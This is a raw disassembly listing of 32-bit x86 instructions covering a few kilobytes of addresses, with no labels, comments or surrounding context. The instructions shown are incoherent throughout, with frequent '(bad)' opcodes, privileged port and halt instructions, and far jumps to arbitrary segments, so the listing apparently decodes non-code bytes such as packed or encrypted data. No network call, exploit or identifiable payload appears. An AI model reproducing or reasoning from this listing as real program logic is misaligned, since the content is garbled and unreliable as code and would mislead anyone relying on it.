  411f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f69:	mov    ebp,DWORD PTR [ebp-0x69]
  411f6c:	rcr    DWORD PTR [edx],cl
  411f6e:	inc    edi
  411f6f:	nop
  411f70:	mov    eax,0x9e78863
  411f75:	les    eax,FWORD PTR ds:0x2078a56c
  411f7b:	sbb    ebp,DWORD PTR [esi-0x23]
  411f7e:	dec    edx
  411f7f:	or     ecx,DWORD PTR [esi+0x22086e83]
  411f85:	cmp    DWORD PTR [edi],edx
  411f87:	cmp    al,0x1d
  411f89:	add    eax,0x6d2dbcc2
  411f8e:	fidiv  DWORD PTR [esi-0x36]
  411f91:	mov    eax,0x69d0c98b
  411f96:	xor    esp,DWORD PTR [edx]
  411f98:	nop
  411f99:	xor    al,0x63
  411f9b:	fmul   DWORD PTR [ebx+esi*2-0x391fbd0d]
  411fa2:	hlt    
  411fa3:	sbb    al,0x28
  411fa5:	clc    
  411fa6:	adc    al,0x7f
  411fa8:	mov    esi,0x94562c30
  411fad:	or     esi,DWORD PTR [eax-0x320bf154]
  411fb3:	push   eax
  411fb4:	jmp    0x44c:0x64fc821c
  411fbb:	mov    DWORD PTR [ebp+0x2b],ecx
  411fbe:	scas   al,BYTE PTR es:[edi]
  411fbf:	cwde   
  411fc0:	cmp    eax,ebx
  411fc2:	jg     0x411f4a
  411fc4:	retf   
  411fc5:	clc    
  411fc6:	and    edi,DWORD PTR ds:0xae90558f
  411fcc:	push   ebx
  411fcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fce:	cmp    ecx,DWORD PTR [edx]
  411fd0:	ror    bl,0x32
  411fd3:	ficomp WORD PTR [eax-0x1c]
  411fd6:	js     0x412057
  411fd8:	test   dl,0x9f
  411fdb:	cld    
  411fdc:	jmp    0xec62:0x4c4679db
  411fe3:	xor    al,0x85
  411fe5:	data16 out dx,al
  411fe7:	fst    DWORD PTR [ebx+0x5a706971]
  411fed:	pop    esp
  411fee:	arpl   WORD PTR [esi],bp
  411ff0:	into   
  411ff1:	scas   eax,DWORD PTR es:[edi]
  411ff2:	jmp    0x9f6804c0
  411ff7:	cmp    ah,BYTE PTR [esi+eax*8-0x48]
  411ffb:	lds    eax,FWORD PTR [edx+0x46]
  411ffe:	jb     0x411fbd
  412000:	jecxz  0x411ff8
  412002:	aad    0xc2
  412004:	dec    eax
  412005:	out    0x6f,al
  412007:	xor    eax,0xb1853e41
  41200c:	popa   
  41200d:	adc    eax,0xca5d7ad8
  412012:	int3   
  412013:	in     al,0xe6
  412015:	cdq    
  412016:	fwait
  412017:	lock scas al,BYTE PTR es:[edi]
  412019:	add    eax,0xe68399dd
  41201e:	push   ds
  41201f:	stos   BYTE PTR es:[edi],al
  412020:	jmp    0x412022
  412022:	popf   
  412023:	push   ds
  412024:	dec    ebp
  412025:	push   esp
  412026:	lds    ebx,FWORD PTR [eax+eax*1-0x3c04abfa]
  41202d:	stos   BYTE PTR es:[edi],al
  41202e:	out    dx,eax
  41202f:	out    0xa3,al
  412031:	pushf  
  412032:	pop    edx
  412033:	ja     0x4120b0
  412035:	pop    esi
  412036:	xor    cl,BYTE PTR [ecx+0x59]
  412039:	add    eax,0x8ed57e6
  41203e:	jns    0x411fcc
  412040:	adc    esp,edi
  412042:	loope  0x4120aa
  412044:	sahf   
  412045:	mov    ch,0xe1
  412047:	sti    
  412048:	retf   
  412049:	and    BYTE PTR [ebx+eiz*4-0x1e],al
  41204d:	lock fmul DWORD PTR [esp+eax*1-0x3c]
  412052:	inc    esp
  412053:	pop    ds
  412054:	pop    ebp
  412055:	mov    edi,0x38c0b5ef
  41205a:	mov    eax,ds:0x536eb993
  41205f:	push   ecx
  412060:	rol    DWORD PTR [eax+0x22e017b0],0xf9
  412067:	adc    al,BYTE PTR [edi-0x2ec60606]
  41206d:	add    eax,0x63a5c93
  412072:	loope  0x412023
  412074:	jge    0x412063
  412076:	stc    
  412077:	cmp    cl,BYTE PTR [edx+esi*8+0x41]
  41207b:	mov    WORD PTR [eax+0x351575d2],ss
  412081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412082:	js     0x4120d1
  412084:	cmp    ch,BYTE PTR [edi]
  412086:	inc    ebx
  412087:	pop    edx
  412088:	sbb    eax,DWORD PTR [edi]
  41208a:	out    0x5f,al
  41208c:	std    
  41208d:	mov    WORD PTR [edx],ss
  41208f:	pop    ebp
  412090:	xor    BYTE PTR ds:0xdf67fb69,ch
  412096:	cwde   
  412097:	inc    ecx
  412098:	dec    ebp
  412099:	jmp    0x4b39:0x3309ba1b
  4120a0:	test   DWORD PTR [edi-0x63424fd1],edi
  4120a6:	jge    0x4120cf
  4120a8:	mov    edx,0xa0ccc787
  4120ad:	jbe    0x412031
  4120af:	xchg   edx,eax
  4120b0:	mov    esi,0x5ed0a90a
  4120b5:	call   0xea6deb3f
  4120ba:	sbb    eax,0xf2f09aa3
  4120bf:	add    esi,ecx
  4120c1:	mov    cl,0xe4
  4120c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120c4:	or     BYTE PTR [ebx],dh
  4120c6:	xor    al,BYTE PTR [ebp+0x45165367]
  4120cc:	or     eax,0x946c7f87
  4120d1:	jno    0x412053
  4120d3:	(bad)  
  4120d4:	xchg   esp,eax
  4120d5:	rcl    DWORD PTR [ebx+0x3f],cl
  4120d8:	aaa    
  4120d9:	or     ch,dh
  4120db:	and    ah,BYTE PTR [edi+0x65]
  4120de:	pushf  
  4120df:	mov    dh,BYTE PTR [esi-0x41]
  4120e2:	push   ebp
  4120e3:	push   ebp
  4120e4:	pop    es
  4120e5:	jne    0x412105
  4120e7:	cmp    edi,DWORD PTR ds:0x2ea0
  4120ec:	xor    BYTE PTR [ecx-0x6d58e6c1],bl
  4120f2:	jmp    0x412151
  4120f4:	fs aas 
  4120f6:	and    eax,0x914efd51
  4120fb:	adc    eax,0xdac71ab8
  412100:	(bad)  
  412101:	nop
  412102:	or     ch,cl
  412104:	sub    ch,BYTE PTR [edi+0xe18f715]
  41210a:	iret   
  41210b:	cmp    bl,bl
  41210d:	cmp    al,0x24
  41210f:	sar    BYTE PTR [ebx],cl
  412111:	inc    ebp
  412112:	fidivr WORD PTR [eax-0x59]
  412115:	push   esi
  412116:	mov    dl,0x9d
  412118:	aas    
  412119:	aam    0x50
  41211b:	(bad)  
  41211c:	icebp  
  41211d:	mov    ebx,0xe9d33f40
  412122:	cld    
  412123:	or     al,0x78
  412125:	outs   dx,DWORD PTR ds:[esi]
  412126:	fdivr  DWORD PTR [ecx-0x6bc5d8d2]
  41212c:	adc    esi,DWORD PTR [edi]
  41212e:	lds    ecx,FWORD PTR [eax]
  412130:	adc    al,0xc1
  412132:	call   0xc8313745
  412137:	ins    WORD PTR es:[edi],dx
  412139:	dec    esp
  41213a:	loope  0x412122
  41213c:	push   ebp
  41213d:	jmp    0x412136
  41213f:	sahf   
  412140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412141:	mov    ebp,0x24085b45
  412146:	inc    edi
  412147:	mov    WORD PTR [edi-0x52823a54],?
  41214d:	iret   
  41214e:	xchg   edx,eax
  41214f:	or     BYTE PTR [edi-0x7d701103],0x55
  412156:	jbe    0x41218a
  412158:	push   edx
  412159:	shl    DWORD PTR [ebp-0x37],0xa
  41215d:	sbb    eax,0xe166bb02
  412162:	sbb    cl,ah
  412164:	xchg   esp,eax
  412165:	inc    ebx
  412166:	sahf   
  412167:	cdq    
  412168:	jle    0x4121e9
  41216a:	fcmovnb st,st(7)
  41216c:	popf   
  41216d:	sahf   
  41216e:	loope  0x41218b
  412170:	(bad)  [edi]
  412172:	out    dx,al
  412173:	mov    DWORD PTR ds:0x80cbd0f6,esi
  412179:	mov    dh,0x24
  41217b:	outs   dx,DWORD PTR ds:[esi]
  41217c:	and    al,0xfa
  41217e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41217f:	xor    esi,esp
  412181:	inc    edx
  412182:	dec    esi
  412183:	mov    eax,0x102b783
  412188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41218a:	mov    ds:0xcc3000fc,eax
  41218f:	je     0x4121f4
  412191:	adc    ch,bl
  412193:	aam    0x7
  412195:	fwait
  412196:	mov    ss,ebp
  412198:	rcr    BYTE PTR [ebp-0x7e],0xc9
  41219c:	xchg   edi,eax
  41219d:	and    ch,al
  41219f:	push   eax
  4121a0:	div    DWORD PTR [eax-0x819599f]
  4121a6:	loop   0x4121fa
  4121a8:	lahf   
  4121a9:	mov    esp,0x7df7269d
  4121ae:	mov    gs:0xe83f20fa,al
  4121b4:	lds    esp,FWORD PTR [eax+0x2f9cc542]
  4121ba:	fisub  DWORD PTR [eax+0x32420c88]
  4121c0:	inc    edi
  4121c1:	adc    dh,BYTE PTR [ebx-0x224fb36b]
  4121c7:	add    eax,0x51cef16f
  4121cc:	je     0x41215a
  4121ce:	mov    ebx,0x227f825f
  4121d3:	stos   BYTE PTR es:[edi],al
  4121d4:	daa    
  4121d5:	sbb    eax,DWORD PTR [edx]
  4121d7:	hlt    
  4121d8:	popa   
  4121d9:	cwde   
  4121da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121db:	xor    eax,0x8595832e
  4121e0:	sub    ah,dl
  4121e2:	pop    ecx
  4121e3:	sahf   
  4121e4:	frstor [ebp+0x56883e68]
  4121ea:	push   edx
  4121eb:	aam    0x5e
  4121ed:	xor    esi,DWORD PTR [edx+0x73]
  4121f0:	pop    edi
  4121f1:	push   eax
  4121f2:	retf   0x78a5
  4121f5:	jae    0x41221e
  4121f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121f8:	in     al,dx
  4121f9:	popa   
  4121fa:	ficom  DWORD PTR [esi]
  4121fc:	lods   al,BYTE PTR ds:[esi]
  4121fd:	push   ds
  4121fe:	stos   DWORD PTR es:[edi],eax
  4121ff:	sbb    al,0x3d
  412201:	imul   ebp,DWORD PTR ds:0x50f145c4,0x57
  412208:	sub    eax,0x6fa03c89
  41220d:	inc    eax
  41220e:	inc    ecx
  41220f:	add    ebx,DWORD PTR [edi+0x655dbd7a]
  412215:	pop    es
  412216:	mov    dl,BYTE PTR [esi+0x506a905d]
  41221c:	xlat   BYTE PTR ds:[ebx]
  41221d:	dec    esp
  41221e:	xor    BYTE PTR [eax-0x1a],dl
  412221:	lods   al,BYTE PTR ds:[esi]
  412222:	jns    0x4121f0
  412224:	repnz cmp BYTE PTR es:[edx+0x2a3deaf0],dh
  41222c:	fs test eax,0x83c88556
  412232:	fistp  DWORD PTR [esi+edi*8+0x16]
  412236:	pop    esi
  412237:	outs   dx,DWORD PTR ds:[esi]
  412238:	mov    ebp,ebp
  41223a:	mov    dl,al
  41223c:	jge    0x4122b9
  41223e:	icebp  
  41223f:	ins    BYTE PTR es:[edi],dx
  412240:	loope  0x412227
  412242:	sbb    esi,ebp
  412244:	xchg   DWORD PTR [esi-0x1b08453a],edx
  41224a:	loop   0x412285
  41224c:	pop    edx
  41224d:	xchg   esi,eax
  41224e:	ret    0x43ba
  412251:	xchg   edx,eax
  412252:	xchg   esp,eax
  412253:	popf   
  412254:	out    0x48,eax
  412256:	repnz shl al,cl
  412259:	inc    ebx
  41225a:	mov    eax,ds:0x17986186
  41225f:	sub    BYTE PTR [ecx-0x5a3d5c75],al
  412265:	mov    ebp,0xf797eca3
  41226a:	push   esp
  41226b:	leave  
  41226c:	(bad)  
  41226d:	adc    eax,0xe5907565
  412272:	shl    ecx,cl
  412274:	mov    DWORD PTR [ebx+0x3032056f],edx
  41227a:	pop    ebx
  41227b:	dec    ecx
  41227c:	lds    edx,FWORD PTR [edx]
  41227e:	in     eax,0xd3
  412280:	mov    eax,ds:0x624ac002
  412285:	or     al,0x5a
  412287:	popa   
  412288:	pushf  
  412289:	dec    edx
  41228a:	push   cs
  41228b:	stc    
  41228c:	jb     0x412216
  41228e:	cmp    DWORD PTR [ecx+edx*4],ecx
  412291:	sub    ecx,edi
  412293:	lds    edx,FWORD PTR gs:[ebp-0x63]
  412297:	sar    DWORD PTR [edi],1
  412299:	lahf   
  41229a:	mov    DWORD PTR [ecx+0x4d],0x5050bb6
  4122a1:	push   esp
  4122a2:	retf   0x5eb3
  4122a5:	sub    ebp,edi
  4122a7:	sar    BYTE PTR [edi],0xfa
  4122aa:	pop    dx
  4122ac:	jl     0x41223e
  4122ae:	jmp    0x41223d
  4122b0:	fsubr  st,st(6)
  4122b2:	inc    edx
  4122b3:	inc    esp
  4122b4:	ss inc eax
  4122b6:	xlat   BYTE PTR ds:[ebx]
  4122b7:	pop    esi
  4122b8:	bound  edi,QWORD PTR [edi+0x2a973411]
  4122be:	push   0x2f08b6cd
  4122c3:	loop   0x412323
  4122c5:	xchg   esp,eax
  4122c6:	jae    0x4122dd
  4122c8:	sbb    al,0xb2
  4122ca:	mov    ebp,0x18d067a7
  4122cf:	push   esp
  4122d0:	sbb    eax,0xd80774f
  4122d5:	sbb    ecx,DWORD PTR [ebp+0x45]
  4122d8:	dec    ebx
  4122d9:	imul   ecx,DWORD PTR [eax],0xfb1d9b7c
  4122df:	xor    DWORD PTR [ebx+0x1d7497a1],esi
  4122e5:	jne    0x4122c3
  4122e7:	jmp    0xd3cf:0x9c6a3a5d
  4122ee:	jmp    0x80b5:0x2cb533a1
  4122f5:	xor    BYTE PTR [ecx+0x6102c7c8],ch
  4122fb:	imul   edi,DWORD PTR [ebx],0x9c5cb051
  412301:	push   0x13
  412303:	cmp    eax,0x104bc0d0
  412308:	(bad)  
  412309:	dec    DWORD PTR [eax+0x54c3055d]
  41230f:	push   es
  412310:	and    ebx,ebp
  412312:	mov    bh,0xce
  412314:	inc    esi
  412315:	dec    eax
  412316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412317:	jns    0x4122aa
  412319:	jns    0x4122b7
  41231b:	test   DWORD PTR [edx],edi
  41231d:	cmp    al,BYTE PTR [ebp+0x2099e5db]
  412323:	pop    ebx
  412324:	sbb    cl,bh
  412326:	repnz xor BYTE PTR [eax+0x73cdd81e],0xe3
  41232e:	mov    esi,0xfe1b1c3c
  412333:	mov    ebp,DWORD PTR [eax]
  412335:	stos   BYTE PTR es:[edi],al
  412336:	push   ecx
  412337:	aad    0xd5
  412339:	stos   BYTE PTR es:[edi],al
  41233a:	hlt    
  41233b:	pop    eax
  41233c:	stc    
  41233d:	test   BYTE PTR [edx],ch
  41233f:	adc    al,0x7f
  412341:	mov    ds:0x38b36028,eax
  412346:	mov    ecx,DWORD PTR [ebx]
  412348:	std    
  412349:	or     ch,BYTE PTR [ecx-0x6a45aca2]
  41234f:	clc    
  412350:	mov    ah,BYTE PTR [ebx-0x57]
  412353:	sbb    DWORD PTR [edi+ebp*1],ecx
  412356:	push   ds
  412357:	dec    ebx
  412358:	sti    
  412359:	mov    ah,0xdc
  41235b:	push   0xb70573a3
  412360:	inc    ecx
  412361:	add    DWORD PTR ds:0x4e31a343,edi
  412367:	sti    
  412368:	lds    esi,FWORD PTR [ebp+0x5f]
  41236b:	test   al,0x5c
  41236d:	shr    esp,1
  41236f:	push   cs
  412370:	mov    edi,0x8dbfddc9
  412375:	mov    ds:0x2718b87a,eax
  41237a:	fnstsw WORD PTR [eax]
  41237c:	pop    ecx
  41237d:	je     0x4123ee
  41237f:	in     eax,dx
  412380:	xlat   BYTE PTR ds:[ebx]
  412381:	retf   
  412382:	aam    0xf6
  412384:	inc    eax
  412385:	shl    DWORD PTR [esi+0xe],0x64
  412389:	pop    ebx
  41238b:	je     0x412347
  41238d:	out    dx,al
  41238e:	cmp    BYTE PTR [ebx],0x5
  412391:	xor    eax,0x9486596c
  412396:	pop    edi
  412397:	adc    eax,0xfa367b1d
  41239c:	sub    DWORD PTR [eax-0x12],eax
  41239f:	mov    ah,0x3f
  4123a1:	shl    dh,cl
  4123a3:	dec    ebp
  4123a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a5:	stos   DWORD PTR es:[edi],eax
  4123a6:	jge    0x4123bd
  4123a8:	adc    eax,0x6ebc38fa
  4123ad:	xchg   ebx,eax
  4123ae:	or     cl,ah
  4123b0:	mov    ecx,0x1726f552
  4123b5:	mov    ecx,DWORD PTR [ecx+0xe2fe5bb]
  4123bb:	rcr    BYTE PTR [edi-0x3642e5b4],cl
  4123c1:	cli    
  4123c2:	shr    dl,0x88
  4123c5:	add    cl,bl
  4123c7:	adc    al,0x1a
  4123c9:	dec    esp
  4123ca:	cs fcmovb st,st(3)
  4123cd:	push   ebp
  4123ce:	dec    eax
  4123cf:	(bad)  [edi]
  4123d1:	imul   BYTE PTR [eax-0xd]
  4123d4:	sbb    eax,0xb2d52a60
  4123d9:	pop    ebx
  4123da:	in     eax,dx
  4123db:	xchg   esp,eax
  4123dc:	adc    edi,ebx
  4123de:	or     bl,dl
  4123e0:	aam    0xcb
  4123e2:	mov    WORD PTR ss:[eax],gs
  4123e5:	(bad)  [ebx+0x3c70058]
  4123eb:	xor    al,0xba
  4123ed:	xor    eax,0xa324aa3a
  4123f2:	je     0x41237b
  4123f4:	(bad)  
  4123f5:	jge    0x41245e
  4123f7:	icebp  
  4123f8:	std    
  4123f9:	inc    ebx
  4123fa:	adc    ebp,edx
  4123fc:	(bad)  
  4123fe:	adc    BYTE PTR [edi],bh
  412400:	scas   al,BYTE PTR es:[edi]
  412401:	mov    ds:0x3173cdc6,eax
  412406:	or     bl,BYTE PTR [ecx+0xf33d03e]
  41240c:	xchg   edx,eax
  41240d:	xchg   DWORD PTR [esi+0x3b1c5237],ebx
  412413:	enter  0x1b98,0x2d
  412417:	jp     0x4123f1
  412419:	(bad)  
  41241a:	add    DWORD PTR [ebx+eiz*1],esi
  41241d:	sbb    bh,BYTE PTR [eax]
  41241f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412420:	inc    esp
  412421:	pop    eax
  412422:	call   0xf279:0x38bca510
  412429:	jnp    0x412425
  41242b:	inc    eax
  41242c:	out    0xca,eax
  41242e:	scas   al,BYTE PTR es:[edi]
  41242f:	daa    
  412430:	push   eax
  412431:	(bad)  
  412432:	out    dx,al
  412433:	cmc    
  412434:	push   ebp
  412435:	mov    eax,0xd50d2400
  41243a:	dec    ecx
  41243b:	cmc    
  41243c:	(bad)  
  41243d:	sbb    eax,0xbec81baa
  412442:	inc    esi
  412443:	enter  0xbba1,0x54
  412447:	mov    WORD PTR [ecx+0x5206f90b],?
  41244d:	push   esp
  41244e:	and    eax,0x2ea722f0
  412453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412454:	imul   edx,DWORD PTR [eax+edx*4-0x7d95d7b4],0x89738439
  41245f:	xor    cl,BYTE PTR [edi]
  412461:	or     al,0x7f
  412463:	inc    ebp
  412464:	add    ebp,DWORD PTR [eax+0x35]
  412467:	mov    dh,0xa2
  412469:	jl     0x412400
  41246b:	pusha  
  41246c:	xor    eax,0x1c3e6ed1
  412471:	stos   DWORD PTR es:[edi],eax
  412472:	cmc    
  412473:	(bad)  
  412474:	aaa    
  412475:	enter  0x44d6,0xd7
  412479:	pop    ebx
  41247a:	dec    esi
  41247b:	test   ebx,edx
  41247d:	mul    BYTE PTR [ebx+0x35e6a7d0]
  412483:	retf   0xb907
  412486:	retf   
  412487:	xchg   edi,eax
  412488:	repz sub BYTE PTR [ebp+0x4b785a3d],bl
  41248f:	ficomp DWORD PTR [edi+0x55d2ab3b]
  412495:	or     DWORD PTR [eax],0x31
  412498:	fdivp  st(5),st
  41249a:	and    eax,0xa5be6627
  41249f:	xchg   ecx,eax
  4124a0:	add    ecx,DWORD PTR [edx+0x78f6ca63]
  4124a6:	mov    ?,WORD PTR [eax-0x3f8c549]
  4124ac:	pandn  mm0,QWORD PTR [ecx]
  4124af:	push   ecx
  4124b0:	shl    BYTE PTR [ebx-0x5cb052e],1
  4124b6:	test   DWORD PTR [edx],edi
  4124b8:	add    ebp,DWORD PTR [eax]
  4124ba:	mov    ah,0xf0
  4124bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124bd:	les    ebx,FWORD PTR [edx]
  4124bf:	stos   BYTE PTR es:[edi],al
  4124c0:	cmp    cl,BYTE PTR [esi+0x70e28605]
  4124c6:	std    
  4124c7:	jmp    0x3700:0x519c6f1c
  4124ce:	jp     0x41252c
  4124d0:	mov    ebp,0x6b4a331b
  4124d5:	jb     0x4124f4
  4124d7:	adc    edi,ebp
  4124d9:	jmp    0x412530
  4124db:	add    al,0xdd
  4124dd:	dec    esp
  4124de:	hlt    
  4124df:	xchg   al,dh
  4124e1:	push   ebp
  4124e2:	hlt    
  4124e3:	adc    eax,0xf58afd64
  4124e8:	shl    DWORD PTR [esi+0x1b],0xde
  4124ec:	mov    al,ds:0xff1d81e1
  4124f1:	mov    ch,0x10
  4124f3:	mov    ds:0xb72c6b8a,eax
  4124f8:	test   al,0x23
  4124fa:	shl    DWORD PTR [edi-0x1e629fb4],0x1
  412501:	adc    BYTE PTR [eax-0x51],dh
  412504:	push   esi
  412505:	cmp    BYTE PTR [edi+0x73a54ff3],0xb
  41250c:	mov    al,dl
  41250e:	hlt    
  41250f:	fcomp  st(5)
  412511:	je     0x4124e6
  412513:	xchg   edi,eax
  412514:	pop    es
  412515:	inc    esi
  412516:	push   es
  412517:	scas   eax,DWORD PTR es:[edi]
  412518:	inc    ebx
  412519:	jns    0x412567
  41251b:	pop    esp
  41251c:	mov    esi,0xa08b705b
  412521:	jmp    0x8e0e:0x8ce7350a
  412528:	or     al,0x87
  41252a:	ins    BYTE PTR es:[edi],dx
  41252b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41252c:	pop    ecx
  41252d:	mov    ?,esi
  41252f:	pop    edx
  412530:	add    ebx,0x40f0977f
  412536:	stos   DWORD PTR es:[edi],eax
  412537:	and    al,0x1a
  412539:	pop    esi
  41253a:	nop
  41253b:	test   al,0xdd
  41253d:	out    dx,eax
  41253e:	jno    0x4124ee
  412540:	pusha  
  412541:	sbb    DWORD PTR [edi],edx
  412543:	gs inc ebx
  412545:	xchg   edi,eax
  412546:	and    BYTE PTR [esi],dh
  412548:	mov    bh,0x92
  41254a:	jo     0x4125bd
  41254c:	daa    
  41254d:	(bad)  
  41254e:	sbb    DWORD PTR [edi+0x4f],edi
  412551:	add    eax,edi
  412553:	mov    ch,0xe7
  412555:	cdq    
  412556:	in     al,dx
  412557:	imul   ecx,eax,0x52
  41255a:	loope  0x4125a4
  41255c:	or     edi,DWORD PTR [ebp-0x6e3e4211]
  412562:	mov    edx,0xe2f76cfc
  412567:	call   0x7997:0x871b355d
  41256e:	xchg   esi,eax
  41256f:	retf   0xcc15
  412572:	jo     0x41254b
  412574:	jnp    0x412571
  412576:	pop    eax
  412577:	and    DWORD PTR [edi-0x54],edi
  41257a:	and    DWORD PTR [ebx+edx*4-0x6b],esp
  41257e:	sub    ch,ch
  412580:	pop    ebx
  412581:	jnp    0x4125ab
  412583:	stc    
  412584:	xchg   ecx,eax
  412585:	cmp    bl,dl
  412587:	not    DWORD PTR [ecx*2-0x4df7d4f8]
  41258e:	push   0x4789b874
  412593:	add    ch,0xdf
  412596:	cdq    
  412597:	pop    ss
  412598:	inc    ebx
  412599:	mov    al,ds:0x89eb9214
  41259e:	cli    
  41259f:	xchg   DWORD PTR [edx-0x3b],edi
  4125a2:	aas    
  4125a3:	or     ch,cl
  4125a5:	fdivr  st,st(4)
  4125a7:	stos   BYTE PTR es:[edi],al
  4125a8:	or     esi,DWORD PTR [esi-0x13746a7a]
  4125ae:	out    0xae,eax
  4125b0:	int    0x7e
  4125b2:	lahf   
  4125b3:	xor    eax,0x8e20e898
  4125b8:	inc    edx
  4125b9:	jecxz  0x4125a0
  4125bb:	dec    esi
  4125bc:	jns    0x412594
  4125be:	mov    al,ds:0x857cae
  4125c3:	mov    cl,0xef
  4125c5:	iret   
  4125c6:	cdq    
  4125c7:	pushf  
  4125c8:	and    al,0x7
  4125ca:	cmp    al,BYTE PTR [esi+0x2afb8b59]
  4125d0:	paddusw mm1,mm2
  4125d3:	mov    esp,0x20f9a674
  4125d8:	cmp    edi,DWORD PTR ds:[ebx+ecx*8-0x67]
  4125dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125de:	or     DWORD PTR [ecx-0x2273c755],esp
  4125e4:	xor    edi,ebp
  4125e6:	xchg   ebp,eax
  4125e7:	in     eax,dx
  4125e8:	pop    edi
  4125e9:	je     0x4125fd
  4125eb:	pop    ebp
  4125ec:	outs   dx,BYTE PTR ds:[esi]
  4125ed:	fwait
  4125ee:	dec    eax
  4125ef:	add    ebx,DWORD PTR [esi-0x7c]
  4125f2:	inc    ecx
  4125f3:	(bad)  
  4125f4:	mov    dh,0x0
  4125f6:	popa   
  4125f7:	sub    al,0xf5
  4125f9:	push   ds
  4125fa:	out    dx,eax
  4125fb:	stos   DWORD PTR es:[edi],eax
  4125fc:	(bad)  
  4125fd:	retf   0xb37f
  412600:	scas   eax,DWORD PTR es:[edi]
  412601:	mov    eax,0xcb6a031a
  412606:	scas   eax,DWORD PTR es:[edi]
  412607:	mov    bl,0x6b
  412609:	mov    al,ds:0x182bf187
  41260e:	scas   al,BYTE PTR es:[edi]
  41260f:	in     al,0x57
  412611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412612:	scas   al,BYTE PTR es:[edi]
  412613:	cmp    al,0x35
  412615:	or     DWORD PTR [eax+0x71],ebx
  412618:	in     al,dx
  412619:	push   0xffffffb4
  41261b:	pop    ebp
  41261c:	(bad)  
  41261d:	xchg   esi,eax
  41261e:	hlt    
  41261f:	not    DWORD PTR [esi+esi*8]
  412622:	lahf   
  412623:	fcmove st,st(4)
  412625:	cs jmp 0x412691
  412628:	xor    DWORD PTR [esi+0x3661b704],ebp
  41262e:	in     eax,dx
  41262f:	bound  ebx,QWORD PTR [eax-0x32df0629]
  412635:	push   esi
  412636:	adc    ebp,DWORD PTR [ebx]
  412638:	retf   0xd85a
  41263b:	ss or  al,0x0
  41263e:	push   ebx
  41263f:	or     BYTE PTR ds:0x48cf8e97,bl
  412645:	jne    0x412632
  412647:	jmp    0x5464:0x10473c34
  41264e:	adc    BYTE PTR ds:0x880caffe,dh
  412654:	das    
  412655:	(bad)  
  412656:	call   0x3404:0xec0d1506
  41265d:	mov    cl,0x24
  41265f:	dec    edi
  412660:	lock inc esp
  412662:	loop   0x412647
  412664:	push   es
  412665:	sub    DWORD PTR [ebx],ecx
  412667:	mov    dh,0xee
  412669:	ja     0x412623
  41266b:	aas    
  41266c:	add    ah,al
  41266e:	xor    eax,0x417ae29e
  412673:	repz sbb DWORD PTR [esp+ebx*8],ebp
  412677:	je     0x412606
  412679:	fldenv [eax-0x62]
  41267c:	sub    DWORD PTR [ecx+0x2b],ebp
  41267f:	sub    al,0xaa
  412681:	test   eax,0x17811900
  412686:	stc    
  412687:	in     eax,0x97
  412689:	jecxz  0x412698
  41268b:	mov    BYTE PTR [esi-0x1a],bh
  41268e:	loopne 0x41270f
  412690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412691:	cmp    ebx,esi
  412693:	test   DWORD PTR [esi],ebp
  412695:	fwait
  412696:	jns    0x41270a
  412698:	and    DWORD PTR [edx+ebp*4],edx
  41269b:	inc    edx
  41269c:	jbe    0x41261e
  41269e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41269f:	cld    
  4126a0:	jae    0x41265e
  4126a2:	pop    esi
  4126a3:	jnp    0x412666
  4126a5:	stos   BYTE PTR es:[edi],al
  4126a6:	das    
  4126a7:	mov    ah,0x4b
  4126a9:	ins    BYTE PTR es:[edi],dx
  4126aa:	pop    esi
  4126ab:	imul   ebx,DWORD PTR [ebx+0x23],0xcd72f3cd
  4126b2:	mov    ebp,0x5cfa91ab
  4126b7:	push   ebx
  4126b8:	push   ebp
  4126b9:	bound  ecx,QWORD PTR [eax+ebx*1]
  4126bc:	adc    eax,0xafd9b2f6
  4126c1:	(bad)  
  4126c2:	cld    
  4126c3:	add    ebx,DWORD PTR [edx+eax*8+0x32]
  4126c7:	(bad)  
  4126c8:	ins    BYTE PTR es:[edi],dx
  4126c9:	xchg   BYTE PTR [edi+0x1e4d244b],bl
  4126cf:	sbb    eax,0x9c4adc32
  4126d4:	dec    ebp
  4126d5:	and    al,0xae
  4126d7:	pop    esi
  4126d8:	mov    ebx,DWORD PTR [esi]
  4126da:	(bad)  
  4126db:	push   0x69
  4126dd:	inc    ecx
  4126de:	fwait
  4126df:	xor    eax,0x7fc6101
  4126e4:	in     al,0xbe
  4126e6:	xor    eax,0x82ce507c
  4126eb:	sub    eax,0x49812294
  4126f0:	std    
  4126f1:	ja     0x41271a
  4126f3:	jns    0x4126b2
  4126f5:	fwait
  4126f6:	pop    ecx
  4126f7:	cwde   
  4126f8:	retf   0xdd14
  4126fb:	in     al,0xd1
  4126fd:	or     BYTE PTR [ebp+0x78],ch
  412700:	call   0xe52d52a7
  412705:	mov    ds:0x1fd1afc5,eax
  41270a:	data16 test al,0xcf
  41270d:	inc    ebp
  41270e:	mov    esp,0x257e75aa
  412713:	mov    ecx,0x3a95a9f
  412718:	psubq  mm5,QWORD PTR [esi]
  41271b:	les    ecx,FWORD PTR [edx+eiz*8-0xad4332d]
  412722:	xchg   esi,eax
  412723:	lahf   
  412724:	pop    ebx
  412725:	xor    bh,BYTE PTR [eax-0x21]
  412728:	and    DWORD PTR [edi-0x6b],eax
  41272b:	pop    ds
  41272c:	or     ebx,DWORD PTR [eax+0x14]
  41272f:	test   eax,0x41820ed1
  412734:	jle    0x41276d
